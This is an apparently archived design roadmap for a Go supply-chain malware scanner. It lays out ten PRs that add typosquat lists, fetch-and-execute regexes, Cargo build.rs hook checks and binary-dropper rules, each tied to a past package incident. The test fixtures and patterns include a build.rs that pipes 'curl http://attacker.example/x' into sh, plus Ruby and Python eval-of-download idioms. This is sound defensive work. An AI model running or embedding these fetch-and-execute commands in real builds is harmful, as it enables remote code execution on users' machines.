# Detection-Gap Roadmap

> **Status: all 10 plans shipped.** `go test ./internal/infra/heuristics/...` passes
> 137/137 with zero skips as of v0.13.0. This document is preserved as a design
> record; it describes the implementation intent for each detector.

Each plan was a **single PR**, ordered by ROI (incidents-closed-per-line-of-code).

Acceptance criterion was the same across all plans: **a `t.Skip` in
`internal/infra/heuristics/incidents_test.go` becomes a `PASS`**.

## Summary — all shipped

| Plan | Incidents closed |
|---|---|
| A — widen URL scan beyond JS | (prep for B & C) |
| B — Ruby `eval(Net::HTTP.get(...))` | rest-client_2019, strong_password_2019 |
| C — Python `exec(urlopen(...))` | torchtriton_2022 |
| D — typosquat per-ecosystem refactor | (prep for E & F) |
| E — PyPI typosquat list | colourama_2017 |
| F — crates.io typosquat list | rustdecimal_2022 |
| G — Cargo `build.rs` hook skeleton | (prep for H) |
| H — xrvrv_2023 | xrvrv_2023 |
| I — binary-dropper PyPI nuance | ultralytics_2024 |
| J — binary-dropper crates.io rules | big_decimal_2024 |

---

## Implementation detail (archive)

## Plan A — widen URL scan beyond JS

**Lines**: ~10. **Closes**: 0 incidents alone, but unblocks B & C.

The `containsSuspiciousURL` half of `DetectSourcePatterns` is pure regex
on bytes — works on any source. Right now it's gated by `isJSSource`,
which throws away every `.py` / `.rb` / `.rs` file before we even
look. Splitting the gate per-detector lets the URL scanner see all
languages while the (still JS-shaped) obfuscation regex stays
JS-scoped.

🔧 `internal/infra/heuristics/source_patterns.go`
- Add `isAnalyzableSource(filename) bool` — extends `isJSSource` with
  `.py`, `.rb`, `.rs`, `.go`, `.gemspec`.
- In `DetectSourcePatterns`, replace `if !isJSSource(filename) continue`
  with two narrower gates:
  - `if !isAnalyzableSource(filename) continue` (skip non-source)
  - URL scan: always runs
  - Obfuscation scan: only when `isJSSource(filename)`

🔧 `internal/infra/heuristics/source_patterns_test.go`
- Add a positive test for a `.py` file containing `https://pastebin.com/raw/X`.
- Add a positive test for a `.rb` file containing `https://discord.com/api/webhooks/X`.

✅ No skipped incident PASSes from this alone — but B & C depend on it.

---

## Plan B — Ruby `eval(Net::HTTP.get(...))` obfuscation pattern

**Lines**: ~25. **Closes**: `rest-client_2019`, `strong_password_2019`.

Ruby's canonical "decode-then-execute" idiom isn't `eval(atob(…))` —
it's `eval(Net::HTTP.get(URI(…)))`. Add a second regex tuned for that
shape, scoped to `.rb` files.

🔧 `internal/infra/heuristics/source_patterns.go`
- New `var rubyObfuscatedPayloadPattern = regexp.MustCompile(...)` matching:
  - `eval\s*\(\s*Net::HTTP\.(get|post)\s*\(`
  - `eval\s*\(\s*open\s*\(\s*['"]https?:`
  - `eval\s*\(\s*URI\.(open|read)\s*\(`
- New helper `isRubySource(filename)` → matches `.rb` and `.gemspec`.
- In the loop: when the file is Ruby source, ALSO run
  `rubyObfuscatedPayloadPattern.Match(body)` and set
  `found.obfuscation = true` if it matches.

🔧 `internal/infra/heuristics/source_patterns_test.go`
- Table tests for `eval(Net::HTTP.get(URI('http://x')))` → expects
  `CapObfuscatedPayload`.

🔧 `internal/infra/heuristics/incidents_test.go`
- Un-skip `TestIncidents_RubyGems/rest-client_2019` — uncomment the
  assertion block underneath the `t.Skip` line.
- Un-skip `TestIncidents_RubyGems/strong_password_2019` — needs a real
  fixture similar to rest-client's.

✅ `rest-client_2019` source-side passes.
✅ `strong_password_2019` passes.

---

## Plan C — Python `exec(urlopen(...))` obfuscation pattern

**Lines**: ~25. **Closes**: source side of `torchtriton_2022`.

Python's malware shape: `exec(urllib.request.urlopen(url).read())`,
`exec(base64.b64decode(payload))`, `exec(requests.get(url).text)`.

🔧 `internal/infra/heuristics/source_patterns.go`
- New `var pythonObfuscatedPayloadPattern` matching:
  - `(?:exec|eval)\s*\(\s*urllib\.request\.urlopen\s*\(`
  - `(?:exec|eval)\s*\(\s*requests\.(get|post)\s*\(`
  - `(?:exec|eval)\s*\(\s*base64\.b64decode\s*\(`
  - `(?:exec|eval)\s*\(\s*compile\s*\(\s*base64\.`
- `isPythonSource(filename)` → matches `.py`, `.pyi`, `.pyx`.
- In the loop: when Python source, also run the python regex.

🔧 `internal/infra/heuristics/source_patterns_test.go`
- Positive: `exec(urllib.request.urlopen('http://x').read())` → `CapObfuscatedPayload`.

🔧 `internal/infra/heuristics/incidents_test.go`
- Un-skip `TestIncidents_PyPI/torchtriton_2022` — uncomment the
  `CapSuspiciousURL` assertion in the existing fixture (which already
  has `https://ipinfo.io/ip`).

✅ `torchtriton_2022` passes via the URL hit (already in our blocklist).

---

## Plan D — refactor typosquat to per-ecosystem map

**Lines**: ~30. **Closes**: 0 (refactor only).

Pure prep work. No behavior change. Sets up E, F, and any future
language addition with one-line cost.

🔧 `internal/infra/heuristics/typosquat.go`
- Change `topNpmPackages map[string]bool` →
  `topPackages map[domain.Ecosystem]map[string]bool`.
- Init only `topPackages[domain.EcoNpm]` for now.
- `DetectTyposquat`: replace
  ```go
  if eco != domain.EcoNpm { return 0 }
  ...
  for top := range topNpmPackages { ... }
  ```
  with
  ```go
  list, ok := topPackages[eco]
  if !ok { return 0 }
  ...
  for top := range list { ... }
  ```

🔧 `internal/infra/heuristics/typosquat_test.go`
- Add a test that EcoPyPI returns 0 (no list yet) — proves the gate
  shifted from "only npm" to "only ecosystems with a list".

✅ Existing npm typosquat tests still pass. No incident state changes.

---

## Plan E — PyPI typosquat list

**Lines**: ~5 Go + ~120 text entries. **Closes**: `colourama_2017`.

Curated top-PyPI list. Smaller and tighter than scraping the
download stats — too many real packages share Levenshtein distance ≤ 2
when you scrape the long tail.

📦 `internal/infra/heuristics/top_pypi_packages.txt`
- Hand-pick ~120 entries: requests, urllib3, numpy, pandas, scipy,
  matplotlib, boto3, django, flask, fastapi, sqlalchemy, pytest,
  pillow, beautifulsoup4, lxml, cryptography, click, rich, typer,
  pyyaml, jinja2, **colorama**, **dateutil**, **jellyfish** (typo bait),
  ... (full list TBD; mirror npm's tight curation philosophy).

🔧 `internal/infra/heuristics/typosquat.go`
- `//go:embed top_pypi_packages.txt` → `topPyPIPackagesRaw`.
- Init `topPackages[domain.EcoPyPI] = parseTopList(topPyPIPackagesRaw)`.

🔧 `internal/infra/heuristics/incidents_test.go`
- Un-skip `TestIncidents_PyPI/colourama_2017`.

✅ `colourama_2017` passes (Levenshtein-1 from `colorama`).

---

## Plan F — crates.io typosquat list

**Lines**: ~5 Go + ~80 text entries. **Closes**: `rustdecimal_2022`.

📦 `internal/infra/heuristics/top_crates_packages.txt`
- ~80 entries: serde, serde_json, tokio, clap, anyhow, thiserror,
  reqwest, rust_decimal, bigdecimal, regex, futures, async-trait,
  hyper, axum, actix-web, sqlx, diesel, ...

🔧 `internal/infra/heuristics/typosquat.go`
- `//go:embed top_crates_packages.txt` → `topCratesPackagesRaw`.
- Init `topPackages[domain.EcoCrates] = parseTopList(...)`.

🔧 `internal/infra/heuristics/incidents_test.go`
- Un-skip `TestIncidents_Crates/rustdecimal_2022`.

✅ `rustdecimal_2022` passes (`rustdecimal` vs `rust_decimal`,
distance 1 — the underscore).

---

## Plan G — Cargo `build.rs` install-hook detector skeleton

**Lines**: ~80. **Closes**: 0 alone (paired with H).

Reuses `scriptMatchesMalwarePattern` — the regex itself is
language-agnostic; we just need to know which file to feed it.

📦 `internal/infra/heuristics/install_hook_cargo.go`
```go
// DetectCargoBuildHook scans the contents of a Cargo build.rs file
// for the same malware patterns the npm install-hook detector
// recognises (curl|sh, base64-piped-to-shell, fetches from
// pastebin/discord/etc.). Returns CapInstallHookSuspicious or 0.
func DetectCargoBuildHook(buildRs []byte) domain.Capability {
    if len(buildRs) == 0 { return 0 }
    if scriptMatchesMalwarePattern(string(buildRs)) {
        return domain.CapInstallHookSuspicious
    }
    return 0
}
```

🔧 `internal/infra/heuristics/heuristics.go`
- In `Run(eco, name, manifestRaw, src)`, when `eco == domain.EcoCrates`,
  pull `src.Files["build.rs"]` and call `DetectCargoBuildHook(body)`.
  Append result if non-zero.

📦 `internal/infra/heuristics/install_hook_cargo_test.go`
- Positive: `build.rs` with `Command::new("sh").arg("-c").arg("curl http://… | sh")`.
- Negative: vanilla build.rs that just sets cargo env vars.

✅ No incident PASSes yet (paired with H).

---

## Plan H — un-skip xrvrv_2023

**Lines**: ~15. **Closes**: `xrvrv_2023`.

🔧 `internal/infra/heuristics/incidents_test.go`
- Replace the `t.Skip(...)` in `TestIncidents_Crates/xrvrv_2023` with:
  ```go
  src := usecase.PackageSource{
    Files: map[string][]byte{
      "Cargo.toml": []byte(`[package]\nname = "xrvrv"\n` +
                            `build = "build.rs"\n`),
      "build.rs":   []byte(`fn main() {
        std::process::Command::new("sh")
          .arg("-c")
          .arg("curl -sSL http://attacker.example/x | sh")
          .status()
          .ok();
      }`),
      "src/lib.rs": []byte(`pub fn add(a: i32, b: i32) -> i32 { a + b }`),
    },
  }
  caps := Run(domain.EcoCrates, "xrvrv", nil, src)
  if !hasCap(caps, domain.CapInstallHookSuspicious) {
    t.Fatalf("want CapInstallHookSuspicious from build.rs, got %v", caps)
  }
  ```

✅ `xrvrv_2023` passes.

---

## Plan I — Binary-dropper PyPI nuance

**Lines**: ~50. **Closes**: `ultralytics_2024`.

The hard problem: PyPI wheels legitimately ship `.so` files for
C-extension packages (numpy, pillow, sharp/sharp-py, lxml, etc.). A
naive deny on `.so` flags every legitimate ML library.

The signal we actually want is: **`.so` / ELF-shaped binary in a path
that doesn't look like a C-extension**.

🔧 `internal/infra/heuristics/binary_dropper.go`
- Drop `if eco != domain.EcoNpm { return 0 }`.
- New helper `isExpectedNativePath(eco, filename) bool`:
  - PyPI: returns `true` for paths like
    `<pkg>/_vendor/`, `<pkg>/.libs/`, `<pkg>/lib/`, paths matching
    `*.cpython-*-*.so` or `*.abi3.so` (manylinux conventions).
  - Other ecosystems: returns `false` (no carve-outs).
- The check becomes:
  ```go
  if isSuspiciousBinary(filename) && !isExpectedNativePath(eco, filename) {
    return domain.CapBinaryDropper
  }
  ```

🔧 `internal/infra/heuristics/binary_dropper_test.go`
- Negative: `pillow/_imaging.cpython-310-x86_64-linux-gnu.so` for EcoPyPI → 0
- Positive: `ultralytics/data/.cache/xmrig` for EcoPyPI → CapBinaryDropper
  (no extension, ELF magic — actually we don't sniff magic yet, so use
  `xmrig.bin` or `xmrig.elf` as a proxy and add ELF-magic sniffing in a
  follow-up plan).

🔧 `internal/infra/heuristics/incidents_test.go`
- Un-skip `TestIncidents_PyPI/ultralytics_2024`.
- Update the fixture to use `.../xmrig.elf` (or wait for ELF magic
  detection in a follow-up plan).

✅ `ultralytics_2024` passes.

---

## Plan J — Binary-dropper crates.io rules

**Lines**: ~25. **Closes**: `big_decimal_2024`.

🔧 `internal/infra/heuristics/binary_dropper.go`
- Add EcoCrates branch in `isExpectedNativePath`: returns false for
  every `.so` / `.dll` / `.dylib` (Rust shouldn't ship pre-compiled
  natives — `-sys` crates ship `.a` / `.lib` source archives, not
  ready-to-load shared objects).

🔧 `internal/infra/heuristics/binary_dropper_test.go`
- Positive: `native/payload.so` for EcoCrates → CapBinaryDropper.

🔧 `internal/infra/heuristics/incidents_test.go`
- Un-skip `TestIncidents_Crates/big_decimal_2024`.

✅ `big_decimal_2024` passes.

---

## Summary

| Plan | LOC | Files | Skipped → Pass |
|---|---|---|---|
| A | ~10 | 2 | (prep) |
| B | ~25 | 3 | rest-client_2019, strong_password_2019 |
| C | ~25 | 3 | torchtriton_2022 |
| D | ~30 | 2 | (refactor) |
| E | ~125 | 3 | colourama_2017 |
| F | ~85 | 3 | rustdecimal_2022 |
| G | ~80 | 3 | (skeleton) |
| H | ~15 | 1 | xrvrv_2023 |
| I | ~50 | 3 | ultralytics_2024 |
| J | ~25 | 3 | big_decimal_2024 |

**Total**: ~470 LOC across 10 PRs, closes all 8 currently-skipped
historical incidents.

Suggested order: **A → B → C** (1-day chunk, knocks out 3 incidents),
then **D → E → F** (typosquat lists), then **G → H** (Cargo hooks),
then **I → J** (binary nuance).

Each PR is independent enough to review and revert in isolation.
